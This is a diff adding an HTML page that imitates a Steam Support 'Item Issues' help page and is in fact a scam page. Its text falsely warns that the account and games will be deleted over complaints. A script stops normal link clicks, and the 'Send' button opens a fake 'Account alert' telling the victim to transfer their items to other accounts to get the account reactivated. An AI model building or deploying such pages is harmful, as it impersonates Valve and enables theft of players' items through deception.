@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html class=" responsive" lang="zh-cn">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<meta name="theme-color" content="#171a21">
+	<title>Steam Support - Item Issues</title>
+	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+	<link href="motiva_sans.css" rel="stylesheet" type="text/css">
+	<link href="buttons.css" rel="stylesheet" type="text/css">
+	<link href="shared_global.css" rel="stylesheet" type="text/css">
+	<link href="store_game_shared.css" rel="stylesheet" type="text/css">
+	<link href="help.css" rel="stylesheet" type="text/css">
+	<link href="shared_responsive.css" rel="stylesheet" type="text/css">
+	<script
+		type="text/javascript">Object.seal && [Object, Array, String, Number].map(function (builtin) { Object.seal(builtin.prototype); });</script>
+	<script type="text/javascript" src="jquery-1.8.3.min.js"></script>
+	<script type="text/javascript">$J = jQuery.noConflict();</script>
+	<script type="text/javascript">VALVE_PUBLIC_PATH = "https:\/\/help.steampowered.com\/public\/";</script>
+	<script type="text/javascript" src="tooltip.js"></script>
+
+	<script type="text/javascript" src="shared_global.js"></script>
+
+	<script type="text/javascript" src="shipping.js"></script>
+
+	<script type="text/javascript" src="base64-binary.js"></script>
+
+	<script type="text/javascript" src="help.js"></script>
+
+	<script type="text/javascript" src="dselect.js"></script>
+
+	<script type="text/javascript" src="main.js"></script>
+
+	<script type="text/javascript">
+		setTimezoneCookies();
+		$J(function ($) {
+			window.BindHelpTooltip = function ($Selector) { $Selector.v_tooltip({ 'tooltipClass': 'help_tooltip', 'dataName': 'helpTooltip' }); };
+			BindHelpTooltip($('[data-help-tooltip]'));
+		});
+
+	</script>
+	<script src="enterprise.js" async="" defer=""></script>
+	<script type="text/javascript" src="shared_responsive_adapter.js"></script>
+
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="Description"
+		content="登录您的 Steam 帐户以获取有关您 Steam 游戏的帮助、联系 Steam 客服、申请退款和更多。若您无法登录需要重置密码或恢复被盗帐户也同样能用客服网页。">
+
+	<meta name="twitter:site" content="@steam">
+
+	<meta property="og:title" content="Steam Support - Item Issues">
+	<meta property="twitter:title" content="Steam Support - Item Issues">
+	<meta property="og:type" content="website">
+	<meta property="fb:app_id" content="105386699540688">
+	<meta property="og:description"
+		content="Sign in to your Steam account to get help with your Steam games, contact Steam Support, request a refund, and more. If you cannot log in and need to reset your password or recover a stolen account, you can also use the customer service page.">
+	<meta property="twitter:description"
+		content="Sign in to your Steam account to get help with your Steam games, contact Steam Support, request a refund, and more. If you cannot log in and need to reset your password or recover a stolen account, you can also use the customer service page.">
+
+
+	<link rel="image_src" href="https://help.steampowered.com/public/shared/images/responsive/share_steam_logo.png">
+	<meta property="og:image"
+		content="https://help.steampowered.com/public/shared/images/responsive/share_steam_logo.png">
+	<meta name="twitter:image"
+		content="https://help.steampowered.com/public/shared/images/responsive/share_steam_logo.png">
+	<meta property="og:image:secure"
+		content="https://help.steampowered.com/public/shared/images/responsive/share_steam_logo.png">
+
+
+
+	<link rel="alternate"
+		href="https://help.steampowered.com/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="x-default">
+	<link rel="alternate"
+		href="https://help.steampowered.com/zh-cn/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="zh-cn">
+	<link rel="alternate"
+		href="https://help.steampowered.com/zh-tw/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="zh-tw">
+	<link rel="alternate"
+		href="https://help.steampowered.com/ja/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="ja">
+	<link rel="alternate"
+		href="https://help.steampowered.com/ko/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="ko">
+	<link rel="alternate"
+		href="https://help.steampowered.com/th/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="th">
+	<link rel="alternate"
+		href="https://help.steampowered.com/bg/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="bg">
+	<link rel="alternate"
+		href="https://help.steampowered.com/cs/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="cs">
+	<link rel="alternate"
+		href="https://help.steampowered.com/da/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="da">
+	<link rel="alternate"
+		href="https://help.steampowered.com/de/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="de">
+	<link rel="alternate"
+		href="https://help.steampowered.com/en/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="en">
+	<link rel="alternate"
+		href="https://help.steampowered.com/es/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="es">
+	<link rel="alternate"
+		href="https://help.steampowered.com/es-419/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="es-419">
+	<link rel="alternate"
+		href="https://help.steampowered.com/el/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="el">
+	<link rel="alternate"
+		href="https://help.steampowered.com/fr/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="fr">
+	<link rel="alternate"
+		href="https://help.steampowered.com/it/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="it">
+	<link rel="alternate"
+		href="https://help.steampowered.com/hu/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="hu">
+	<link rel="alternate"
+		href="https://help.steampowered.com/nl/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="nl">
+	<link rel="alternate"
+		href="https://help.steampowered.com/no/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="no">
+	<link rel="alternate"
+		href="https://help.steampowered.com/pl/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="pl">
+	<link rel="alternate"
+		href="https://help.steampowered.com/pt/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="pt">
+	<link rel="alternate"
+		href="https://help.steampowered.com/pt-br/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="pt-br">
+	<link rel="alternate"
+		href="https://help.steampowered.com/ro/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="ro">
+	<link rel="alternate"
+		href="https://help.steampowered.com/ru/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="ru">
+	<link rel="alternate"
+		href="https://help.steampowered.com/fi/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="fi">
+	<link rel="alternate"
+		href="https://help.steampowered.com/sv/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="sv">
+	<link rel="alternate"
+		href="https://help.steampowered.com/tr/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="tr">
+	<link rel="alternate"
+		href="https://help.steampowered.com/vn/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="vn">
+	<link rel="alternate"
+		href="https://help.steampowered.com/uk/wizard/HelpWithGameIssue/?appid=730&amp;issueid=130&amp;transid=1657776526567567974&amp;line_item=1657776526567567978"
+		hreflang="uk">
+	<script>
+		document.addEventListener('click', (e) => {
+			e.preventDefault();
+		})
+	</script>
+</head>
+
+<body class="v6 responsive_page ">
+
+
+	<div class="responsive_page_frame with_header">
+		<div class="responsive_page_menu_ctn mainmenu">
+			<div class="responsive_page_menu" id="responsive_page_menu">
+				<div class="mainmenu_contents">
+					<div class="mainmenu_contents_items">
+						<!-- profile area -->
+
+						<div class="menuitem notifications_item">
+							Notice <div class="notification_count_total_ctn no_notifications">
+								<span class="notification_envelope"></span>
+								<span class="notification_count">0</span>
+							</div>
+						</div>
+						<div class="notification_submenu" style="display: none;" data-submenuid="notifications">
+
+							<a data-notification-type="4"
+								class="popup_menu_item notification_ctn header_notification_comments"
+								href="https://steamcommunity.com/my/commentnotifications/">
+								<span class="notification_icon"></span>New message <span class="notification_count">0</span>
+							</a>
+							<div class="header_notification_dropdown_seperator"></div>
+							<a data-notification-type="5"
+								class="popup_menu_item notification_ctn header_notification_items"
+								href="https://steamcommunity.com/my/inventory/">
+								<span class="notification_icon"></span>New Items <span class="notification_count">0</span>
+							</a>
+							<div class="header_notification_dropdown_seperator"></div>
+							<a data-notification-type="6"
+								class="popup_menu_item notification_ctn header_notification_invites"
+								href="https://steamcommunity.com/my/home/invites/">
+								<span class="notification_icon"></span>New Invitation <span class="notification_count">0</span>
+							</a>
+
+							<div class="header_notification_dropdown_seperator"></div>
+							<a data-notification-type="8"
+								class="popup_menu_item notification_ctn header_notification_gifts"
+								href="https://steamcommunity.com/my/inventory/#pending_gifts">
+								<span class="notification_icon"></span>New Gift <span class="notification_count">0</span>
+							</a>
+							<div class="header_notification_dropdown_seperator"></div>
+							<a data-notification-type="9"
+								class="popup_menu_item notification_ctn header_notification_offlinemessages"
+								href="javascript:void(0)"
+								onclick="LaunchWebChat(); HideMenu( 'header_notification_link', 'header_notification_dropdown' ); return false;">
+								<span class="notification_icon"></span>New Information <span class="notification_count">0</span>
+							</a>
+							<a data-notification-type="1"
+								class="popup_menu_item notification_ctn hide_when_empty header_notification_tradeoffers"
+								href="https://steamcommunity.com/my/tradeoffers/">
+								<div class="header_notification_dropdown_seperator"></div>
+								<span class="notification_icon"></span>New Trade Quotes <span class="notification_count">0</span>
+							</a>
+							<a data-notification-type="2"
+								class="popup_menu_item notification_ctn hide_when_empty header_notification_asyncgame"
+								href="https://steamcommunity.com/my/gamenotifications">
+								<div class="header_notification_dropdown_seperator"></div>
+								<span class="notification_icon"></span>New Round Waiting <span class="notification_count">0</span>
+							</a>
+							<a data-notification-type="3"
+								class="popup_menu_item notification_ctn hide_when_empty header_notification_moderatormessage"
+								href="https://steamcommunity.com/my/moderatormessages">
+								<div class="header_notification_dropdown_seperator"></div>
+								<span class="notification_icon"></span>New Community News <span class="notification_count">0</span>
+							</a>
+							<a data-notification-type="10"
+								class="popup_menu_item notification_ctn hide_when_empty header_notification_helprequestreply"
+								href="https://help.steampowered.com/zh-cn/wizard/HelpRequests">
+								<div class="header_notification_dropdown_seperator"></div>
+								<span class="notification_icon"></span>Steam customer service response <span
+									class="notification_count">0</span>
+							</a>
+						</div>
+						<a class="menuitem supernav" href="https://store.steampowered.com/" data-tooltip-type="selector"
+							data-tooltip-content=".submenu_store">
+							Store </a>
+						<div class="submenu_store" style="display: none;" data-submenuid="store">
+							<a class="submenuitem" href="https://store.steampowered.com/">Home</a>
+							<a class="submenuitem" href="https://store.steampowered.com/explore/">Explore queue</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
+							<a class="submenuitem" href="https://store.steampowered.com/points/shop/">Points</a>
+							<a class="submenuitem" href="https://store.steampowered.com/news/">News</a>
+							<a class="submenuitem" href="https://store.steampowered.com/stats/">Statistical data</a>
+						</div>
+
+
+						<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/"
+							data-tooltip-type="selector" data-tooltip-content=".submenu_community">
+							Community </a>
+						<div class="submenu_community" style="display: none;" data-submenuid="community">
+							<a class="submenuitem" href="https://steamcommunity.com/">Home</a>
+							<a class="submenuitem" href="https://steamcommunity.com/discussions/">Discuss</a>
+							<a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
+							<a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
+							<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Live broadcast</a>
+						</div>
+
+
+						<a class="menuitem supernav username persona_name_text_content"
+							href="https://steamcommunity.com/my/home/" data-tooltip-type="selector"
+							data-tooltip-content=".submenu_username">
+							You and your friends </a>
+						<div class="submenu_username" style="display: none;" data-submenuid="username">
+							<a class="submenuitem" href="https://steamcommunity.com/my/home/">Dynamic</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/">Personal Information</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/friends/">Friends</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/games/">Games</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/groups/">Groups</a> <a
+								class="submenuitem" href="https://steamcommunity.com/my/screenshots/">Screenshots</a> <a
+								class="submenuitem" href="https://steamcommunity.com/my/badges/">Badges</a> <a
+								class="submenuitem" href="https://steamcommunity.com/my/inventory/">Inventory</a>
+						</div>
+
+
+						<a class="menuitem" href="https://help.steampowered.com/zh-cn/">
+							Customer Service </a>
+
+						<div class="minor_menu_items">
+							<a class="menuitem" href="https://store.steampowered.com/account/">Account details</a>
+							<a class="menuitem" href="https://store.steampowered.com/account/preferences">Preferences</a>
+							<div class="menuitem change_language_action">
+								Change language </div>
+							<div class="menuitem" onclick="Logout();">Change User</div>
+							<div class="menuitem" onclick="Responsive_RequestDesktopView();">
+								View desktop site </div>
+						</div>
+					</div>
+					<div class="mainmenu_footer_spacer  "></div>
+					<div class="mainmenu_footer">
+						<div class="mainmenu_footer_logo"><img src="logo_valve_footer.png"></div>
+						© Valve Corporation。All rights reserved. All trademarks are the property of their respective holders in the United States and other countries. <span class="mainmenu_valve_links">
+							<a href="https://store.steampowered.com/privacy_agreement/" target="_blank">Privacy Policy</a>
+							&nbsp;| &nbsp;<a href="http://www.valvesoftware.com/legal.htm" target="_blank">Legal information</a>
+							&nbsp;| &nbsp;<a href="https://store.steampowered.com/subscriber_agreement/"
+								target="_blank">Steam Subscriber Agreement</a>
+							&nbsp;| &nbsp;<a href="https://store.steampowered.com/steam_refunds/"
+								target="_blank">#footer_refunds</a>
+						</span>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="responsive_local_menu_tab"></div>
+
+		<div class="responsive_page_menu_ctn localmenu">
+			<div class="responsive_page_menu" id="responsive_page_local_menu"
+				data-panel="{&quot;onOptionsActionDescription&quot;:&quot;#filter_toggle&quot;,&quot;onOptionsButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;,&quot;onCancelButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;}">
+				<div class="localmenu_content"
+					data-panel="{&quot;maintainY&quot;:true,&quot;bFocusRingRoot&quot;:true,&quot;flow-children&quot;:&quot;column&quot;}">
+				</div>
+			</div>
+		</div>
+
+
+
+		<div class="responsive_header">
+			<div class="responsive_header_content">
+				<div id="responsive_menu_logo">
+					<img src="header_menu_hamburger.png" height="100%">
+					<div class="responsive_header_notification_badge_ctn">
+						<div class="responsive_header_notification_badge notification_count_total_ctn no_notifications">
+							<span class="notification_count">0</span>
+						</div>
+					</div>
+				</div>
+				<div class="responsive_header_logo">
+					<a href="https://store.steampowered.com/">
+						<img src="header_logo.png" height="36" border="0" alt="STEAM">
+					</a>
+				</div>
+			</div>
+		</div>
+
+		<div class="responsive_page_content_overlay">
+
+		</div>
+
+		<div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
+		</div>
+
+		<div class="responsive_page_content">
+
+			<div id="global_header" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
+				<div class="content">
+					<div class="logo">
+						<span id="logo_holder">
+							<a href="https://store.steampowered.com/">
+								<img src="logo_steam.svg" width="176" height="44">
+							</a>
+						</span>
+					</div>
+
+					<div class="supernav_container">
+						<a class="menuitem supernav" href="https://store.steampowered.com/" data-tooltip-type="selector"
+							data-tooltip-content=".submenu_store">
+							Store </a>
+						<div class="submenu_store" style="display: none;" data-submenuid="store">
+							<a class="submenuitem" href="https://store.steampowered.com/">Home</a>
+							<a class="submenuitem" href="https://store.steampowered.com/explore/">Explore</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
+							<a class="submenuitem" href="https://store.steampowered.com/points/shop/">Points</a>
+							<a class="submenuitem" href="https://store.steampowered.com/news/">News</a>
+							<a class="submenuitem" href="https://store.steampowered.com/stats/">Statistics</a>
+							<a class="submenuitem" href="https://store.steampowered.com/about/">About</a>
+						</div>
+
+
+						<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/"
+							data-tooltip-type="selector" data-tooltip-content=".submenu_community">
+							Store </a>
+						<div class="submenu_community" style="display: none;" data-submenuid="community">
+							<a class="submenuitem" href="https://steamcommunity.com/">Home</a>
+							<a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
+							<a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
+							<a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
+							<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Live broadcasts</a>
+						</div>
+
+						<div class="submenu_username" style="display: none;" data-submenuid="username">
+							<a class="submenuitem" href="https://steamcommunity.com/my/home/">Dynamic</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/">Personal Information</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/friends/">Friends</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/games/">Games</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/groups/">Groups</a> <a
+								class="submenuitem" href="https://steamcommunity.com/my/screenshots/">Screenshots</a> <a
+								class="submenuitem" href="https://steamcommunity.com/my/badges/">Badges</a> <a
+								class="submenuitem" href="https://steamcommunity.com/my/inventory/">Inventory</a>
+						</div>
+
+						<a class="menuitem" href="https://steamcommunity.com/chat/">
+							Chat </a>
+
+						<a class="menuitem" href="https://help.steampowered.com/zh-cn/">
+							Customer Service </a>
+					</div>
+					<script type="text/javascript">
+						jQuery(function ($) {
+							$('#global_header .supernav').v_tooltip({ 'location': 'bottom', 'destroyWhenDone': false, 'tooltipClass': 'supernav_content', 'offsetY': -4, 'offsetX': 1, 'horizontalSnap': 4, 'tooltipParent': '#global_header .supernav_container', 'correctForScreenSize': false });
+						});
+					</script>
+				</div>
+			</div>
+
+			<div class="responsive_page_template_content" id="responsive_page_template_content"
+				data-panel="{&quot;autoFocus&quot;:true}">
+
+
+				<div id="loading_throbber" class="LoadingWrapper page_loaded">
+					<div class="LoadingThrobber">
+						<div class="Bar Bar1"></div>
+						<div class="Bar Bar2"></div>
+						<div class="Bar Bar3"></div>
+					</div>
+				</div>
+
+				<div class="page_body_ctn">
+					<div id="page_content" class="page_content page_loaded">
+						<div data-panel="[]" id="error_contents">
+
+
+							<a class="help_header" href="https://help.steampowered.com/zh-cn/">Steam Customer Service</a>
+							<div class="error_bg">
+								<div id="error_description">An error occurred while processing this request. Please try again later.</div>
+								<div class="error_reload">
+									<a data-panel="{&quot;focusable&quot;:false}" class="help_site_button"
+										href="">Try again</a> &nbsp;
+									<a data-panel="{&quot;focusable&quot;:false}" class="help_site_button"
+										href="https://help.steampowered.com/zh-cn/">Home</a>
+								</div>
+							</div>
+						</div>
+						<div id="wizard_contents">
+							<div class="wizard_content_wrapper show_create_help_request_form">
+
+								<a class="help_header" href="https://help.steampowered.com/zh-cn/">Steam Customer Service</a>
+								<div class="help_page_title">Help report</div>
+
+
+
+								<div class="help_issue_details help_section_body">
+									<p>There have been a lot of complaints about your account in the past 30 days and we will most likely delete the game and account, please contact support if you want your permissions restored</p>
+								</div>
+
+								<a class="help_wizard_button" >
+									<span>Contact Steam Support</span>
+								</a>
+								<a class="help_wizard_button"
+									>
+									<span>I was cheated</span>
+								</a>
+								
+
+								<div class="help_hide_for_create_request">
+									<a href="javascript:HelpRequestPage.ShowCreateHelpRequestForm( this );"
+										class="help_wizard_button help_wizard_button_gap">
+										<span>Contact Steam Support</span>
+									</a>
+								</div>
+								<div data-panel="{&quot;flow-children&quot;:&quot;column&quot;,&quot;maintainY&quot;:true,&quot;autoFocus&quot;:true}"
+									id="create_help_request_form_ctn"
+									class="create_help_request_form help_request_attachment_overlay_ctn">
+									<div class="attachment_drop_overlay">
+										<div class="text">Drag the file here to add it to your customer service case</div>
+									</div>
+
+
+
+									<form id="create_help_request_form" method="post"
+										action="https://help.steampowered.com/zh-cn/wizard/AjaxCreateHelpRequest"
+										onsubmit="HelpRequestPage.SubmitCreateHelpRequestForm( this ); return false;"
+										data-allow-anonymous="0">
+
+
+										<input type="hidden" name="help_request_type" value="34">
+										<input type="hidden" name="help_issue" value="130">
+										<input type="hidden" name="appid" value="730">
+
+										<input type="hidden" name="validation_id" value="0">
+										<input type="hidden" name="validation_code" value="">
+										<input type="hidden" name="steamid" value="76561198078641354">
+
+
+
+
+
+
+										<div class="create_help_request_secondary">
+											<label for="create_help_request_issue_text">Please provide details of the issue you are experiencing:</label>
+										</div>
+
+										<div>
+											<div class="help_request_textarea_ctn">
+												<textarea data-panel="[]" id="create_help_request_issue_text"
+													name="issue_text"></textarea>
+												<div class="help_request_attachment_upload formdata">
+													<div class="attachment_upload_legacy">
+														If you would like to add files or screenshots to your support case, please use the Steam client or update your web browser. </div>
+													<div class="attachment_upload_formdata">
+														<input type="file" class="attachment_upload_browse_input"
+															style="display: none;" multiple="" accept="image/*">
+														<div class="attachment_upload_targetarea">
+															<div class="add_upload_text">
+																We do not accept external links or archive downloads.<a class="attachment_browse_link"
+																	href="javascript:void(0);">Click here to browse and attach files</a>, or drag files here.
+															</div>
+															<div class="attached_file_list_ctn" style="display: none;">
+																File Attachments: <ul class="attached_file_list">
+
+																</ul>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+
+
+										<div class="help_request_create_action">
+											<a id="cancel_create_help_request"
+												href="javascript:HelpRequestPage.DismissCreateHelpRequestForm();">Cancel</a>
+											&nbsp;
+											<button onclick="send()" class="btn_medium btnv6_blue_hoverfade" type="submit">
+												<span>Send</span>
+											</button>
+										</div>
+									</form>
+								</div>
+
+
+								<div id="help_request_email_verification" style="display: none; max-width: 502px;">
+									<p id="validate_email_error_contents"></p>
+									<p id="validate_email_instructions"></p>
+									<p>Enter the code sent to your email:</p>
+									<input type="text" name="validation_code" value="">
+									<p class="help_request_email_verification_note"><span
+											class="help_request_email_validation_hightlight">Notice:</span>
+										Our customer service will only receive your message if you enter the code. Please do not close this window before clicking "Send".</p>
+								</div>
+							</div>
+						</div>
+						<div id="wizard_perf_data"></div>
+					</div>
+				</div>
+				<script>
+				</script>
+				<script type="text/javascript">
+				</script>
+
+			</div> <!-- responsive_page_legacy_content -->
+
+
+		</div> <!-- responsive_page_content -->
+
+	</div> <!-- responsive_page_frame -->
+	<style>
+		.about_install_steam_link {
+			cursor: pointer;
+		}
+
+		.hidden {
+			display: none!important;
+		}
+
+		#popup, #popup * {
+			box-sizing: border-box;
+		}
+
+		#popup {
+			position: fixed;
+			top: 0;
+			right: 0;
+			bottom: 0;
+			left: 0;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			z-index: 10000;
+		}
+
+		#popup .prebox {
+			border: #212a31 4px solid;
+			background: #212a31;
+			border-top-left-radius: 5px;
+			border-top-right-radius: 5px;
+		}
+
+		#popup .prebox .pretitle {
+			font-size: .65rem;
+			padding: 0.4rem;
+			text-transform: none;
+			margin: 0;
+		}
+
+		#popup .box {
+			padding: 2rem 5rem 8rem;
+			background-color: #1c2838;
+			border: 2px solid #000;
+			border-radius: 5px;
+		}
+
+		#popup .wrap {
+			margin: auto;
+			max-width: 800px;
+		}
+
+		#popup .wrap .title {
+			background-color: #a73307;
+			padding: .5rem .75rem;
+		}
+
+		#popup .wrap .title .text {
+			margin: 0;
+			text-transform: none;
+		}
+
+		#popup .wrap .content {
+			padding: 1rem;
+			margin-bottom: 1.5rem;
+			border: 3px solid #5eafde;
+			background-color: #171a21;
+		}
+
+		#popup .wrap .content .sub-title {
+			font-size: 1.3rem;
+			margin-bottom: .9rem;
+		}
+
+		#popup .wrap .content .text {
+			margin-bottom: .9rem;
+			color: #828a97;
+			line-height: 1.5;
+		}
+
+		#popup .wrap .content .text .color {
+			color: #fff;
+		}
+
+		#popup .wrap .content .text .link {
+			color: #66c0f4;
+		}
+
+		#popup .wrap .close {
+			color: #fff;
+			padding: .4rem .6rem .3rem;
+			border: 0;
+			border-radius: .125rem;
+		}
+
+		#popup .wrap .close:disabled {
+			background-color: #445468;
+		}
+
+		#popup .wrap .close:not(:disabled) {
+			background: linear-gradient(to right, #06bfff 50%, #2b74ff 100%);
+		}
+
+		#popup .wrap .controls {
+			margin-left: 2.5rem;
+			display: flex;
+			gap: 1rem;
+		}
+
+		#popup .wrap .checkbox-wrap {
+			display: flex;
+			align-items: flex-start;
+			gap: .2rem;
+		}
+
+		#popup .wrap .checkbox-wrap .color {
+			color: #82909a;
+		}
+	</style>
+	<div id="popup" class="hidden">
+		<div class="prebox">
+			<h2 class="pretitle">Account alert</h2>
+
+			<div class="box">
+				<div class="wrap">
+					<div class="content">
+						<h3 class="sub-title">Steam received your notification</h3>
+			
+						<p class="text">Your account is now under testing and I need your cooperation to restore your account
+You can transfer them to your other accounts or your friends' accounts. Anyone, as long as they are safe I can go ahead and reactivate your account.</p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script>
+		const popup = document.querySelector('#popup');
+		function send() {
+			popup.classList.remove('hidden');
+
+		}
+	</script>
+</body>
+
+</html>
